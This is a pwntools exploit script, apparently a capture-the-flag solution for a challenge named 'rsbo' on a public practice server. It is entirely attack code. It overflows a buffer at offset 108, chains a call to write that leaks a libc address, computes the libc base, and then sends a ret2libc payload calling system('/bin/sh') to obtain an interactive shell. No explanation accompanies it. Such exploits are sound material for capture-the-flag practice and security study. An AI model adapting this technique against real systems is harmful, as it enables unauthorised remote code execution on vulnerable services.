from pwn import *
context(log_level = "debug")

target = remote('hackme.inndy.tw', 7706)
#target = process('./rsbo')
libc = ELF('./libc-2.23.so.i386')
elf = ELF('./rsbo-01c51ca9a7b9db3d69289c6dbb1cd758')
plt_write = elf.symbols['write']
got_write = elf.got['write']
ret_addr = elf.symbols['_start']
#gdb.attach(target, "b *0x8048733")
payload = fit({108:[p32(plt_write), p32(ret_addr), p32(1), p32(got_write), p32(4)]},filler = "\x00")
target.send(payload)
write_addr = u32(target.recv(4))
libc.address = write_addr - libc.symbols['write']
sh = next(libc.search('/bin/sh'))

payload = fit({108:[p32(libc.symbols['system']), p32(0xdeadbeef), p32(sh)]},filler = '\x00')	
target.send(payload)
target.interactive()